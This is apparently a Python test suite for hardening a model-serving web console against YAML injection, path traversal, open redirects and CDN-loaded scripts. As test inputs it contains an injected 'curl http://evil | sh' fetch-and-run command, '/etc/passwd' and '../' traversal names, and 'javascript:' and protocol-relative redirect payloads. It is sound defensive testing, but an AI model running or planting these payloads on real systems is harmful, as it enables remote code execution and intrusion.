"""Web console hardening (Phase 8 remediation).

Covers the injection surface (llama-swap YAML built from operator
input), the reflected `back` parameter, profile-name validation at the
filesystem/YAML boundary, lane routing, and asset vendoring.
"""
import json
import re
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest import mock

import yaml

import modelctl
from modelctl_web import app as web_app
from modelctl_web import mutate

PROFILE = {
    "name": "m1", "repo_id": "r/m", "file": "f", "model_path": "/x/m.gguf",
    "binary": "/x/llama-server",
    "config": {"device": "SYCL0", "split_mode": "", "tensor_split": "",
               "ctx": 8192, "cache_type_k": "q8_0", "cache_type_v": "q4_0",
               "flash_attn": "auto", "ttl": 3600, "mtp": "off", "fit": "off",
               "extra": ""},
    "env": [], "enabled": True,
}


class TestLlamaSwapEntryIsData(unittest.TestCase):
    """The entry used to be hand-built YAML text with env values and the
    binary path interpolated raw, then parsed back and merged."""

    def _entry(self, **overrides):
        profile = {**PROFILE, **overrides}
        text, _ok, _msgs = modelctl.render_llama_swap_entry(profile)
        return text

    def test_hostile_env_value_cannot_inject_structure(self):
        text = self._entry(env=['A=x"\n  cmd: curl http://evil | sh\n#'])
        parsed = yaml.safe_load(text)
        body = parsed["m1"]
        # One cmd, and it is the llama-server command -- not the injected one.
        self.assertIn("llama-server", body["cmd"])
        self.assertNotIn("evil", body["cmd"])
        # The hostile text survives intact as data, in env.
        self.assertTrue(any("evil" in e for e in body["env"]),
                        "the value should round-trip as data, not vanish")

    def test_quote_in_env_does_not_break_the_document(self):
        text = self._entry(env=['A=say "hi"', "B=back\\slash"])
        parsed = yaml.safe_load(text)
        self.assertIn("A=say \"hi\"", parsed["m1"]["env"])

    def test_newline_in_binary_path_does_not_break_the_document(self):
        # An accidental paste is the common case; it used to make every
        # future sync fail to parse for every profile.
        text = self._entry(binary="/x/llama-server\nmalicious: true")
        parsed = yaml.safe_load(text)
        self.assertEqual(set(parsed), {"m1"},
                         "a second top-level key was injected")

    def test_entry_still_carries_the_expected_fields(self):
        parsed = yaml.safe_load(self._entry())
        body = parsed["m1"]
        self.assertIn("--port ${PORT}", body["cmd"])
        self.assertEqual(body["ttl"], 3600)
        self.assertEqual(body["capabilities"]["context"], 8192)


class TestProfileNameValidation(unittest.TestCase):
    def test_traversal_is_rejected(self):
        for bad in ("../defaults", "a/b", "..", "/etc/passwd"):
            with self.subTest(name=bad):
                with self.assertRaises(ValueError):
                    modelctl.validate_profile_name(bad)

    def test_yaml_hostile_names_are_rejected(self):
        for bad in ("foo: bar", "a b", "yes\nno", ""):
            with self.subTest(name=bad):
                with self.assertRaises(ValueError):
                    modelctl.validate_profile_name(bad)

    def test_ordinary_names_pass(self):
        for good in ("qwen3-30b", "Model_1", "a.b-c", "m1"):
            with self.subTest(name=good):
                self.assertEqual(modelctl.validate_profile_name(good), good)

    def test_load_profile_refuses_to_escape_the_profiles_dir(self):
        import modelctl_errors
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "defaults.json").write_text(json.dumps({"ttl": 1}))
            profiles = root / "profiles"
            profiles.mkdir()
            with mock.patch.object(modelctl, "PROFILES_DIR", profiles):
                with self.assertRaises(modelctl_errors.ProfileNotFoundError):
                    modelctl.load_profile("../defaults")


class TestSafeNext(unittest.TestCase):
    """`next` is reflected into the login form and followed on success.

    Phase 3 retired `_safe_back` with the job pages that used it; the same
    escaping rule now guards login's `next`, and the fallback is the SPA
    root rather than the demolished dashboard.
    """

    def test_javascript_url_is_neutralized(self):
        self.assertEqual(web_app._safe_next("javascript:fetch('/x')"), "/v2/")

    def test_protocol_relative_is_neutralized(self):
        self.assertEqual(web_app._safe_next("//evil.example/x"), "/v2/")

    def test_internal_path_is_kept(self):
        self.assertEqual(web_app._safe_next("/v2/models/m1"), "/v2/models/m1")

    def test_empty_defaults_to_the_console_root(self):
        self.assertEqual(web_app._safe_next(""), "/v2/")


class TestLaneRouting(unittest.TestCase):
    """Benchmarks belong on the benchmark lane; on the single-worker
    mutation lane a multi-minute autotune blocked every profile save."""

    def _lane_of(self, submit, *args, **kwargs):
        seen = {}

        class FakeRunner:
            def submit(self, job_type, title, fn, payload=None, **kw):
                seen["lane"] = kw.get("lane", "mutation")
                return "job1"

        submit(FakeRunner(), *args, **kwargs)
        return seen["lane"]

    def test_plan_test_uses_the_benchmark_lane(self):
        self.assertEqual(
            self._lane_of(mutate.submit_plan_test, "m1", "planabc"),
            "benchmark")

    def test_autotune_uses_the_benchmark_lane(self):
        self.assertEqual(
            self._lane_of(mutate.submit_autotune, "m1"), "benchmark")

    def test_smoke_test_uses_the_benchmark_lane(self):
        self.assertEqual(
            self._lane_of(mutate.submit_smoke_test, "m1"), "benchmark")


class TestVendoredAssets(unittest.TestCase):
    def test_no_external_script_tags(self):
        tpl_dir = Path(web_app.TEMPLATE_DIR)
        offenders = []
        for path in tpl_dir.rglob("*.html"):
            text = path.read_text()
            for marker in ("https://unpkg.com", "https://cdn.",
                           "http://cdn.", "//unpkg.com"):
                if marker in text:
                    offenders.append(f"{path.name}: {marker}")
        self.assertEqual(offenders, [],
                         "the console must not load assets from a CDN: it "
                         "has to work offline, and a script tag with no "
                         "integrity is code execution in the console origin")

    def test_no_htmx_surface_survives(self):
        """Phase 3 demolished the server-rendered console.

        htmx, the shared /static mount and every page template went with
        it; the console is the compiled SPA under console/dist. A stray
        vendored copy would mean a route somewhere still serves the old
        surface.
        """
        web_dir = Path(web_app.__file__).parent
        self.assertFalse((web_dir / "static").exists(),
                         "the /static mount was removed with the old console")
        self.assertEqual(
            sorted(p.name for p in (web_dir / "templates").glob("*.html")),
            ["base.html", "error.html", "login.html"],
            "only login and the last-resort error page are still rendered "
            "server-side")
        for path in (web_dir / "templates").glob("*.html"):
            # Jinja comments cannot load anything; scan the markup only, so
            # a comment that mentions htmx is not a false positive.
            text = re.sub(r"\{#.*?#\}", "", path.read_text(), flags=re.S)
            self.assertNotIn("htmx", text, f"{path.name} still loads htmx")
            self.assertNotIn("/static/", text,
                             f"{path.name} references the removed /static mount")
            # Self-contained: no external script/style at all, so these two
            # pages keep working with the SPA bundle absent.
            self.assertNotIn("<script src", text,
                             f"{path.name} loads an external script")
            self.assertNotIn("<link rel=\"stylesheet\"", text,
                             f"{path.name} loads an external stylesheet")


class TestJobLaneCancellationRecordsPgid(unittest.TestCase):
    def test_register_process_records_the_group(self):
        import os
        import subprocess
        from modelctl_web.jobs import JobContext, JobStore

        with TemporaryDirectory() as tmp:
            store = JobStore(Path(tmp) / "jobs.db")
            job_id = store.create("t", "t")
            ctx = JobContext(store, job_id)
            proc = subprocess.Popen(["sleep", "5"], preexec_fn=os.setpgrp)
            try:
                ctx.register_process(proc)
                self.assertTrue(hasattr(proc, "pgid"),
                                "cancellation cannot signal the process "
                                "group without a recorded pgid")
                self.assertEqual(proc.pgid, os.getpgid(proc.pid))
            finally:
                proc.kill()
                proc.wait()


if __name__ == "__main__":
    unittest.main()
